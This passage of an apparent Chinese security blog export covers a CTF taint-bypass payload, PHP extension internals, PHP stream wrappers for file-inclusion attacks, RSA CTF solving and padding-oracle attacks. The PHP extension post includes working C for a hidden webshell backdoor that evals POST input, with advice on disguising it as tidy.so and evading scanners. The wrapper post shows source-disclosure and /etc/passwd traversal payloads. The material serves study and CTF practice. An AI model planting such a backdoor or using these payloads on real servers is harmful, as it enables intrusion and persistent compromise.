<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (f === <span class="string">"Sink"</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (shadow(args[<span class="number">0</span>]))</span><br><span class="line">			&#123;</span><br><span class="line">				errExit(<span class="string">"Value passed into sink cannot be tained"</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">const</span> arr = actual(args[<span class="number">0</span>])</span><br><span class="line">			<span class="keyword">if</span> (!(arr <span class="keyword">instanceof</span> <span class="built_in">Array</span>) || arr.length !== <span class="number">0x10</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				errExit(<span class="string">"must use an array with length 16 as the key"</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr.length; i++)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (shadow(arr[i])) <span class="comment">// check here</span></span><br><span class="line">				&#123;</span><br><span class="line">					errExit(<span class="string">"Value passed into sink cannot be tained"</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span> (actual(arr[i]) !== secret[i])</span><br><span class="line">				&#123;</span><br><span class="line">					errExit(<span class="string">"Wrong key!"</span>)</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">console</span>.log(<span class="built_in">String</span>(fs.readFileSync(<span class="string">"flag"</span>)));</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<p>也不能是被 train 过的, 这就需要一点技巧来 bypass, 这里我用的是 delete 这个操作符, 因为 delete 影响的是左值对象的本身. 而这里 hook 的时候并不会将左值给 taint 掉, 只会将返回值 undefined 给 taint.<br>我们可以搞一个大小 256 的数组, 将 secret 作为删除的 key, 然后遍历找到是哪个 key 被 delete 掉, 我们就能获得 secret 的值而不被 taint.<br>最后 payload 如下:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">key=[];a=[]; <span class="keyword">for</span> (z=<span class="number">0</span>;z&lt;<span class="number">16</span>;z++)&#123;<span class="keyword">for</span> (i = <span class="number">0</span>;i&lt;<span class="number">256</span>;i++) &#123;a[i]=<span class="number">0</span>;&#125;;t=<span class="string">"Source"</span>();<span class="keyword">delete</span> a[t[z]];<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++)&#123;<span class="keyword">if</span> (a[i] === <span class="literal">undefined</span>)&#123;key[z]=i;&#125;&#125;&#125;;<span class="string">"Sink"</span>(key);</span><br></pre></td></tr></table></figure>
<p>可以看到不是很复杂, 这道题好像也有很多队伍做出来 233</p>
]]></content>
      <tags>
        <tag>web</tag>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP 扩展学习</title>
    <url>/2019/07/31/PHP-%E6%89%A9%E5%B1%95%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>PHP 类似于 python 也是运行在解释器上的, PHP 的叫 zend, python 的叫 cpython,<br>这些都是官方实现, 像 python 也有 jython, pypy 啥的, 用其他语言写的解释器.  </p>
<a id="more"></a>

<p>两者有个非常相似的地方, 或者说动态语言都非常相似的地方, 是都存在一个万能基类,<br>python 的叫 <code>PyObject</code>, php 的叫 <code>zval</code>. python 的因为没看过, 不太了解, 在 PHP 中,<br>是靠 union 结构体来实现的  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">union</span> _zend_value &#123;</span><br><span class="line">	zend_long         lval;				<span class="comment">/* long value */</span></span><br><span class="line">	<span class="keyword">double</span>            dval;				<span class="comment">/* double value */</span></span><br><span class="line">	zend_refcounted  *counted;</span><br><span class="line">	zend_string      *str;</span><br><span class="line">	zend_array       *arr;</span><br><span class="line">	zend_object      *obj;</span><br><span class="line">	zend_resource    *res;</span><br><span class="line">	zend_reference   *ref;</span><br><span class="line">	zend_ast_ref     *ast;</span><br><span class="line">	zval             *zv;</span><br><span class="line">	<span class="keyword">void</span>             *ptr;</span><br><span class="line">	zend_class_entry *ce;</span><br><span class="line">	zend_function    *func;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">		<span class="keyword">uint32_t</span> w1;</span><br><span class="line">		<span class="keyword">uint32_t</span> w2;</span><br><span class="line">	&#125; ww;</span><br><span class="line">&#125; zend_value;</span><br></pre></td></tr></table></figure>
<p>因为是 union, 其实这大小在 amd64 上其实就是 8 字节, C 语言这神奇的特性其实在某种形式上做到了多态.<br>一切对象都可以用 zval 来表达.</p>
<p>而 PHP 扩展, 就是可以直接干预这个 zend 虚拟机本身的执行, 比如加几个函数, 替换原来的函数之类的. zend 虚拟机会在启动时执行一系列函数,<br>加载扩展里面定义的各种函数, PHP_MINIT, PHP_RINIT, PHP_FUNCTION 等等.  </p>
<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/php/php-src.git -b php-7.3.7</span><br><span class="line"><span class="built_in">cd</span> php-7.3.7</span><br><span class="line">./ext/ext_skel.php --ext extname</span><br><span class="line">./configure</span><br></pre></td></tr></table></figure>
<p>就能自动生成一套模版, 毕竟是开源产品, 对开发者非常友好,<br>CLion 可以用以下 CMakelist 添加高亮, 方便开发.  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmake_minimum_required(VERSION 3.3)</span><br><span class="line">project(backdoor)</span><br><span class="line"></span><br><span class="line">add_custom_target(makefile COMMAND make WORKING_DIRECTORY $&#123;PROJECT_SOURCE_DIR&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cmake_minimum_required(VERSION 3.6)</span><br><span class="line">project(backdoor C)</span><br><span class="line"></span><br><span class="line">message(&quot;Begin cmaking of PHP extension ...&quot;)</span><br><span class="line"></span><br><span class="line"># -std&#x3D;gnu99</span><br><span class="line">set(CMAKE_C_STANDARD 99)</span><br><span class="line">set(CMAKE_C_FLAGS &quot;$&#123;CMAKE_C_FLAGS&#125; -ggdb -O0 -Wall -std&#x3D;gnu99 -fvisibility&#x3D;hidden&quot;)</span><br><span class="line">set(ENV&#123;PROJECT_ROOT&#125; &quot;$&#123;CMAKE_HOME_DIRECTORY&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># NOTE: This CMake file is just for syntax highlighting in CLion, 替换成你自己的路径</span><br><span class="line">include_directories(</span><br><span class="line">        ~&#x2F;temp&#x2F;php-src&#x2F; </span><br><span class="line">        ~&#x2F;temp&#x2F;php-src&#x2F;main</span><br><span class="line">        ~&#x2F;temp&#x2F;php-src&#x2F;Zend</span><br><span class="line">        ~&#x2F;temp&#x2F;php-src&#x2F;TSRM</span><br><span class="line">        ~&#x2F;temp&#x2F;php-src&#x2F;ext</span><br><span class="line">        ~&#x2F;temp&#x2F;php-src&#x2F;ext&#x2F;standard</span><br><span class="line">        ~&#x2F;temp&#x2F;php-src&#x2F;sapi</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">set(SOURCE_FILES</span><br><span class="line">        backdoor.c</span><br><span class="line">        php_backdoor.h</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">if(EXISTS &quot;$ENV&#123;PROJECT_ROOT&#125;&#x2F;config.h&quot;)</span><br><span class="line">    set(SOURCE_FILES &quot;$&#123;SOURCE_FILES&#125;;config.h&quot;)</span><br><span class="line">endif()</span><br><span class="line"></span><br><span class="line">add_library(backdoor $&#123;SOURCE_FILES&#125;)</span><br><span class="line"></span><br><span class="line">message(&quot;End cmaking of PHP extension ...&quot;)</span><br></pre></td></tr></table></figure>

<p>接下来学习一下扩展的几种利用方式  </p>
<h2 id="替换-zend-compile-string"><a href="#替换-zend-compile-string" class="headerlink" title="替换 zend_compile_string"></a>替换 zend_compile_string</h2><p>这在 <code>php-src/Zend/zend_compile.h:722</code> 被定义, <code>php-src/Zend/zend.c:835</code> 被实现,  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">zend_compile_string = compile_string;</span><br></pre></td></tr></table></figure>
<p>定义的时候就是定义为函数指针, 可以说是这么故意设计的, 就是为了方便替换.<br>这个函数就是 zend engine 解析代码到 op code 的函数, 正如其名, 起到编译器的作用.  </p>
<p>而 eval, include 等等, 都会调用这个函数, 因为都需要编译到 op code 才能真正被执行.<br>所以我们就能替换这个函数到自己定义的函数, 比如在 <code>compile_string</code> 的同时, 把<br>它输入的字符串, 也就是代码打印出来, 就能在某些时候起到解密的作用.<br>因为某些加密就是单纯各种变换最后 eval 一下而已, 本质原因是 PHP 本身就很灵活, 各种反射, 还有 $$var 这种东西,<br>如果替换变量名/函数名, 大概率会导致代码不可用. 所以很多加密其实通过替换 zend_compile_string 就可以完全解密.  </p>
<p>了解了原理, 那么写起来不是很困难, 就是将 source_string 打印出来即可, 放在 <code>RINIT</code> 中, 每次请求都会重新替换一次.  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">zend_op_array *<span class="title">dump_while_eval</span><span class="params">(zval *source_string, <span class="keyword">char</span> *filename)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    php_printf(<span class="string">"\n\nfilename: \n"</span>);</span><br><span class="line">    php_printf(<span class="string">"%s"</span>, filename);</span><br><span class="line">    php_printf(<span class="string">"\n\neval_code: \n"</span>);</span><br><span class="line">    php_printf(<span class="string">"%s"</span>, Z_STRVAL_P(source_string));</span><br><span class="line">    php_printf(<span class="string">"\n\nresult: \n"</span>);</span><br><span class="line">    <span class="keyword">return</span> compile_string(source_string, filename);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; PHP_RINIT_FUNCTION</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHP_RINIT_FUNCTION(backdoor) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(ZTS) &amp;&amp; defined(COMPILE_DL_BACKDOOR)</span></span><br><span class="line">    ZEND_TSRMLS_CACHE_UPDATE();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="comment">// hook eval</span></span><br><span class="line">    zend_compile_string = dump_while_eval;</span><br><span class="line">    <span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这时候 <code>make &amp;&amp; make install</code> 一下, 在 ini 中开启扩展, php -a 一下, 就可以发现已经成功了, 因为 php -a 说到底也得<br>经过编译这个过程.</p>
<h2 id="留后门"><a href="#留后门" class="headerlink" title="留后门"></a>留后门</h2><p>这个其实我感觉还是比较隐蔽的, 可以把原来的比如 <code>;extension=tidy</code>, <code>tidy.so</code>, 换成自己的, 然后开启,<br>我估计很少有人会注意到, 查杀的话得检查 HASH 之类的, 说实话挺麻烦的, 毕竟每次更新这个 hash 都会变.<br>而留后门的话一般都是在 RINIT 中添加, 每次都检查 <code>$_POST</code> 上有没有自己留下的后门密码, 有的话执行一下,<br>相当于把 webshell 藏到扩展里面了.<br>当然也可以自己给添加一个 my_eval 函数之类的, D 盾 100% 查不出来 233  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">PHP_FUNCTION(my_backdoor_eval) &#123;</span><br><span class="line">    <span class="keyword">char</span>* tmp;</span><br><span class="line">    <span class="keyword">size_t</span> len;</span><br><span class="line">    ZEND_PARSE_PARAMETERS_START(<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">        Z_PARAM_STRING(tmp, len)</span><br><span class="line">    ZEND_PARSE_PARAMETERS_END();</span><br><span class="line">    zend_eval_string(tmp, <span class="literal">NULL</span>, (<span class="keyword">char</span> *)<span class="string">""</span> TSRMLS_CC);</span><br><span class="line">    RETURN_TRUE</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; PHP_RINIT_FUNCTION</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHP_RINIT_FUNCTION(backdoor) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(ZTS) &amp;&amp; defined(COMPILE_DL_BACKDOOR)</span></span><br><span class="line">    ZEND_TSRMLS_CACHE_UPDATE();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">char</span> *password = <span class="string">"execute"</span>;</span><br><span class="line"></span><br><span class="line">    zval * arr, *code = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (arr = zend_hash_str_find(&amp;EG(symbol_table), <span class="string">"_POST"</span>, <span class="keyword">sizeof</span>(<span class="string">"_POST"</span>) - <span class="number">1</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (Z_TYPE_P(arr) == IS_ARRAY &amp;&amp;</span><br><span class="line">            (code = zend_hash_str_find(Z_ARRVAL_P(arr), password, <span class="built_in">strlen</span>(password)))) &#123;</span><br><span class="line">            zend_eval_string(Z_STRVAL_P(code), <span class="literal">NULL</span>, <span class="string">""</span> TSRMLS_CC);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; arginfo</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ZEND_BEGIN_ARG_INFO(arginfo_my_backdoor_eval, <span class="number">0</span>)</span><br><span class="line">                ZEND_ARG_INFO(<span class="number">0</span>, str)</span><br><span class="line">ZEND_END_ARG_INFO()</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; backdoor_functions[]</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> zend_function_entry backdoor_functions[] = &#123;</span><br><span class="line">	PHP_FE(my_backdoor_eval,       arginfo_my_backdoor_eval)</span><br><span class="line">	PHP_FE_END</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br></pre></td></tr></table></figure>

<h2 id="RASP"><a href="#RASP" class="headerlink" title="RASP"></a>RASP</h2><p>这个其实我感觉前途应该是最大的, 可以参考 <a href="https://github.com/laruence/taint" target="_blank" rel="noopener">https://github.com/laruence/taint</a>,<br>毕竟是 PHP 的开发者, 真的 tql.  </p>
<p>我参考之前的 php_apd, 通过替换函数表里面的函数也实现了一个, 当然肯定没有鸟哥直接劫持 op code 的操作牛逼,<br>劫持 op code 的执行可以拦截 eval, echo 之类的关键字, 而劫持函数表只能劫持函数, 相对更局限一些.<br>而且我的实现感觉 100% 有内存泄露 (逃</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">PHP_RINIT_FUNCTION(backdoor) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(ZTS) &amp;&amp; defined(COMPILE_DL_BACKDOOR)</span></span><br><span class="line">    ZEND_TSRMLS_CACHE_UPDATE();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">char</span>* internal_func_name = <span class="string">"system"</span>; <span class="comment">// 内置函数名</span></span><br><span class="line">    <span class="keyword">char</span>* new_internal_func_name = <span class="string">"__internal__"</span>; <span class="comment">// 新内置函数名</span></span><br><span class="line"></span><br><span class="line">    zend_internal_function *internal_func = zend_hash_str_find_ptr(EG(function_table), internal_func_name, <span class="built_in">strlen</span>(internal_func_name));</span><br><span class="line">    zend_internal_function *copy_internal_func = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(zend_internal_function));</span><br><span class="line">    <span class="built_in">memcpy</span>(copy_internal_func, internal_func, <span class="keyword">sizeof</span>(zend_internal_function));</span><br><span class="line">    </span><br><span class="line">    zend_hash_str_add_ptr(EG(function_table), new_internal_func_name, <span class="built_in">strlen</span>(new_internal_func_name), copy_internal_func);</span><br><span class="line">    zend_hash_str_del(EG(function_table), internal_func_name, <span class="built_in">strlen</span>(internal_func_name));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *replace_code = <span class="string">"function __temp__($a) &#123;var_dump($a);if (preg_match('/bash/i', $a) === 0) &#123;__internal__($a);&#125; else &#123;echo $a.' is banned';&#125;&#125;;"</span>; <span class="comment">// 替换的函数代码</span></span><br><span class="line"></span><br><span class="line">    zend_eval_string(replace_code, <span class="literal">NULL</span> , <span class="string">""</span>);</span><br><span class="line">    zend_op_array *replace_func = zend_hash_str_find_ptr(EG(function_table), <span class="string">"__temp__"</span>, <span class="built_in">strlen</span>(<span class="string">"__temp__"</span>));</span><br><span class="line"></span><br><span class="line">    zend_hash_str_add_ptr(EG(function_table), internal_func_name, <span class="built_in">strlen</span>(internal_func_name), replace_func);</span><br><span class="line">    *(replace_func-&gt;refcount) += <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    zend_hash_str_del(EG(function_table), <span class="string">"__temp__"</span>, <span class="built_in">strlen</span>(<span class="string">"__temp__"</span>));</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>web</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP 支持的各种协议学习</title>
    <url>/2019/01/04/PHP%20%E6%94%AF%E6%8C%81%E7%9A%84%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>PHP 支持了不少协议, 特别是其中的 <code>php://</code> 和 <code>phar://</code> 经常能在意想不到的地方发挥意想不到的作用 233. 之前都是花式百度, 这次系统学习一下. 所有的协议都可以在<a href="http://php.net/manual/en/wrappers.php" target="_blank" rel="noopener">官网</a>上找到.</p>
<p>这些协议一般配合 <code>file_get_contents</code>, <code>include</code> 使用, 部分情况下受到 php.ini 里面的 <code>allow_url_fopen</code>(默认开启) 和 <code>allow_url_include</code>(默认关闭) 限制. 如果 <code>allow_url_include</code> 开启的话, 是非常危险的, 可能存在远程文件包含.</p>
<a id="more"></a>

<h3 id="0x01-file"><a href="#0x01-file" class="headerlink" title="0x01 file://"></a>0x01 file://</h3><p>不受 <code>allow_url</code> 限制, 用来读取文件, 一般不会用到, 毕竟 file_get_contents 和 include 本身就是这个功能 233.</p>
<p>而且 file:// 必须跟着绝对路径, 比如 file:///etc/passwd, file://../../../etc/passwd 是不行的</p>
<h3 id="0x02-http"><a href="#0x02-http" class="headerlink" title="0x02 http://"></a>0x02 http://</h3><p>受到 <code>allow_url</code> 限制. 这个就是 http 协议啦, 也就是说 file_get_contents 可以当 curl 用, 不过比较麻烦就是了, 像这样的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$file = $_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">if</span>(file_get_contents($file) === <span class="string">"The quick brown fox jumps over a lazy dog."</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>就可以在自己服务器上写个内容是 <code>The quick brown fox jumps over a lazy dog.</code> 的 html, 然后 <code>file=http://xxxx.xxx/xx.html</code> 就可以了, 当然后面还有更简单的绕过方法.</p>
<h3 id="0x03-ftp"><a href="#0x03-ftp" class="headerlink" title="0x03 ftp://"></a>0x03 ftp://</h3><p>比较鸡肋, 我试了一下, 开启了 ftp 扩展的情况下, php5, php7 都没用, 似乎已经被废弃了</p>
<h3 id="0x04-php"><a href="#0x04-php" class="headerlink" title="0x04 php://"></a>0x04 php://</h3><p>相对来说内容最多, 也是最重要的一个协议, 协议底下分了许多种流, 各个流分开看看. 需要注意的是这个协议也受到 <code>allow_url</code> 限制, 远程读取的流都不给 <code>include</code> 233</p>
<p><strong>@ php://stdin, php://stdout, php://stderr</strong></p>
<p>这个是拿来给命令行程序用的0.0 比如</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">file_put_contents(<span class="string">"php://stdout"</span>, file_get_contents(<span class="string">"php://stdin"</span>));</span><br></pre></td></tr></table></figure>

<p>就是将从 stdin 里面的数据输出到 stdout 里面去</p>
<p><strong>@ php://input</strong></p>
<p>对任何 HTTP method 都可以用, 读取 HTTP body 里面的内容, 用来读二进制文件的 POST 有奇效, 也可以用来绕过上面的例子</p>
<p><strong>@ php://output</strong></p>
<p>官网上解释的很清楚233, 跟 echo, print 一样, 命令行就输出到 stdout, cgi 就输出到 html 里面</p>
<p><strong>@ php://memory and php://temp</strong></p>
<p>可以拿来存东西, 但是感觉很鸡肋, 因为在 fd 关闭之后就直接清空了, 233 真的是只能拿来临时存放东西</p>
<p><strong>@ php://filter</strong></p>
<p>最骚的东西, 可以用于读取源码, 比如</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span> $_GET[<span class="string">'file'</span>].<span class="string">".php"</span>;</span><br></pre></td></tr></table></figure>

<p>本来其实没有什么大问题, 但是如果 file 是 <code>php://filter/read=convert.base64-encode/resource=index</code> 读取出来的内容将 base64encode, 从而直接显示出来, 可以通过这种方式来读取 <code>.php</code> 文件.</p>
<p>注意过滤器是可以叠加的, 可以这样 <code>php://filter/read=convert.base64-encode/read=convert.base64-encode/resource=index.php</code> base64两次.</p>
<p>PS. read= 可以省略, 也就是说可以写成 <code>php://filter/convert.base64-encode/resource=index</code></p>
<p>过滤器除了 <code>convert.base64-encode</code> 还有很多, 可以看<a href="http://php.net/manual/zh/filters.php" target="_blank" rel="noopener">这里</a></p>
<p>这些流也可以拿来写入文件, 比如</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file_put_contents(<span class="string">"php://filter/write=convert.base64-encode/resource=index.php"</span>, <span class="string">"test"</span>); <span class="comment">// 同样 write= 可以省略</span></span><br></pre></td></tr></table></figure>

<p>index.php 中写入的将是 base64 编码过后的 test, 也就是 dGVzdA==   </p>
<p>最后, resource 后面还可以跟其他协议, 甚至可以 <code>resource=php://</code> 这样嵌套, 不过 <code>allow_url</code> 限制不会因此改变. 如果是 include 调用的, 依然受到 <code>allow_url_include</code> 限制.</p>
<h3 id="0x05-compress-zlib-compress-bzip2-zip"><a href="#0x05-compress-zlib-compress-bzip2-zip" class="headerlink" title="0x05 compress.zlib://, compress.bzip2://, zip://"></a>0x05 compress.zlib://, compress.bzip2://, zip://</h3><p>不受 <code>allow_url</code> 限制, 而且 zip:// 只要符合 zip 格式即可, 不用在意后缀名, 所以在可以上传文件而且可以包含这个文件的情况下, 可以拿来任意代码执行. 用法是 <code>zip://path_to_zipfile#filename_in_zip</code>, 注意在地址栏传参的时候记得把 <code>#</code> 换成 <code>%23</code>, 不然会被当成锚点.</p>
<p>比如 <code>include $_GET[&#39;file&#39;].&quot;.php&quot;;</code> 的情况下, 可以上传图片. 就可以将一个含有马的 zip 文件重名成 jpg 后缀上传, 最后 <code>file=zip://upload/xxx.jpg%23backdoor</code> 即可.</p>
<p>另外, compress.bzip2:// 和 compress.zlib:// 对于没有压缩的文件是直接读取原文的, 而且不像 file://, 是支持相对路径的, 可以当做强化版来用, 233 在 <code>parse_url</code> 之后检测 host 的情况下可能有奇效, 比如 <code>compress.bzip2://www.baidu.com/../../../../../../etc/passwd</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php &gt; print_r(parse_url(<span class="string">'compress.bzip2://www.baidu.com/../../../../../../etc/passwd'</span>));</span><br><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [scheme] =&gt; compress.bzip2</span><br><span class="line">    [host] =&gt; www.baidu.com</span><br><span class="line">    [path] =&gt; /../../../../../../etc/passwd</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h3 id="0x06-data"><a href="#0x06-data" class="headerlink" title="0x06 data://"></a><strong>0</strong>x06 data://</h3><p>就和官网上讲的一样 233, <a href="http://www.faqs.org/rfcs/rfc2397.html" target="_blank" rel="noopener">RFC2397</a> 的标准, 格式就是 <code>data:[&lt;mediatype&gt;][;base64],&lt;data&gt;</code>, 你可以在浏览器上输入 data://test,data schema test, 也可以看到浏览器其实也是支持这个协议的, 一般用来通过 html 直接传输图片.</p>
<p>比较可惜的是受到 <code>allow_url</code> 限制, 不过因为 <code>allow_url_fopen</code> 是默认开启的, 拿来构造任意内容还是可以的, 拿来绕上面的例子也是很轻松.</p>
<h3 id="0x07-phar"><a href="#0x07-phar" class="headerlink" title="0x07 phar://"></a>0x07 phar://</h3><p>比较逆天的存在, 不受 <code>allow_url</code> 限制</p>
<ol>
<li>可以这样, phar://test.zip/index.php 代替上面的 zip:// 的作用 (同样不受后缀名影响)</li>
<li>通过 phar pack -f test.phar bd.php 生成的 phar 包来包含 phar 里面的内容 (同样不受后缀名影响)</li>
<li>当然最最最骚的是<a href="https://blog.ripstech.com/2018/new-php-exploitation-technique/" target="_blank" rel="noopener">这个</a>, 只要能上传文件到同一个服务器, 就能任意反序列化, 甚至 <code>file_exist</code> 这样的函数都会受到影响, 然后通过内部类来各种操作得到 flag. 可以说 2018 年的 CTF 竞赛不知道出现了多少遍这个东西 233, 就如文章所说, 真的是开创了一个新的 <code>technique</code>.</li>
</ol>
<p>其他的协议都不是 php 自带的, 需要安装插件, 就不看了 233</p>
]]></content>
      <tags>
        <tag>web</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>RSA 加密及解密</title>
    <url>/2017/11/24/RSA%20%E5%8A%A0%E5%AF%86%E5%8F%8A%E8%A7%A3%E5%AF%86/</url>
    <content><![CDATA[<p>对于解题来说 一般会给你以下信息：模数N、公钥E和密文C. 如果只是做题的话</p>
<a id="more"></a>

<h4 id="0x01-分解模数N"><a href="#0x01-分解模数N" class="headerlink" title="0x01 分解模数N"></a>0x01 分解模数N</h4><p>对于大数可以在 <a href="http://factordb.com" target="_blank" rel="noopener">http://factordb.com</a>上寻找在数据库中是否已经有对应的数字, 如果比较小的话直接在RSAtool2v17上就可以分解.</p>
<h4 id="0x02-对模数N进行因式分解得到两个质数P和Q-计算欧拉函数φ-n-从而得到私钥D"><a href="#0x02-对模数N进行因式分解得到两个质数P和Q-计算欧拉函数φ-n-从而得到私钥D" class="headerlink" title="0x02 对模数N进行因式分解得到两个质数P和Q, 计算欧拉函数φ(n), 从而得到私钥D"></a>0x02 对模数N进行因式分解得到两个质数P和Q, 计算欧拉函数φ(n), 从而得到私钥D</h4><p>φ(n) = (P-1)(Q-1) E*D ≡ 1 (mod φ(n))  也就是说E*D (mod φ(n)) 结果为1 这一步可以直接用RSAtool2v17来解决</p>
<h4 id="0x03-通过私钥D-模数N和密文C来得到原文M"><a href="#0x03-通过私钥D-模数N和密文C来得到原文M" class="headerlink" title="0x03 通过私钥D, 模数N和密文C来得到原文M"></a>0x03 通过私钥D, 模数N和密文C来得到原文M</h4><p>CD ≡ M (mod N)   注意M必然小于N  所以M=CD(mod N) 最后将M化为16进制对应ASCII就行了</p>
<h4 id="0x04-如果是多质数加密"><a href="#0x04-如果是多质数加密" class="headerlink" title="0x04 如果是多质数加密"></a>0x04 如果是多质数加密</h4><p>差别在N的生成为N= p1 * p2 * p3…*pn 和欧拉函数φ(n) = (p1-1)(p2-1)(p3-1)…(pn-1) 上. 其余算法均与双质数相同</p>
<h4 id="0x04-RSA的数学原理以及证明"><a href="#0x04-RSA的数学原理以及证明" class="headerlink" title="0x04 RSA的数学原理以及证明"></a>0x04 RSA的数学原理以及证明</h4><p>可以在<a href="http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html" target="_blank" rel="noopener">这里</a>查看, 讲解的很清楚~<br>PS:私钥同样可以加密信息, 但是在这里信息不是重点, 而是可以证明这个信息是拥有此私钥的人发出的, 相当于发出人对这个信息签了名.</p>
]]></content>
      <tags>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>Padding Oracle + CBC 字节翻转学习</title>
    <url>/2019/02/21/Padding%20Oracle%20+%20CBC%20%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>之前一直就很想了解的技术, 这次同样是在 <a href="https://hgame.vidar.club/" target="_blank" rel="noopener">hgame</a> 上碰到, 刚好从<a href="http://xnianq.cn/2017/07/26/padding-oracle" target="_blank" rel="noopener">师傅</a>那里学习一下, 更详细的可以去看 <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack" target="_blank" rel="noopener">wiki</a>.</p>
<p>简单来讲就是通过服务器对 Padding 正确和错误返回的不同状态, 来猜解所谓的<code>中间值</code>, 从而达成解密数据, 伪造数据.</p>
<a id="more"></a>

<p>以这张图为例子</p>
<p><img src="https://i.loli.net/2019/03/08/5c8279f81fce7.png" alt=""></p>
<p>我们可以暴力枚举倒数第二块密文的最后一个字节 (如果只有一块密文的话就修改 IV), 直到最后一块的最后一个字节刚好为 \x01, 这样服务器将会返回<code>权限验证失败</code>而不是<code>解密失败</code>. 这样将 \x01 与此时爆破出来的倒数第二块密文的字节 xor 一下, 得到的就是<code>中间值</code>, 再将中间值与原来的倒数第二块密文的最后一个字节 xor, 就可以得到明文. 此时再将 \x02 与中间值 xor, 作为密文的最后一个字节, 继续爆破倒数第二个字节, 使得最后两个字节都为 \x02, 就跟上面一样, 可以得到倒数第二位的中间值.</p>
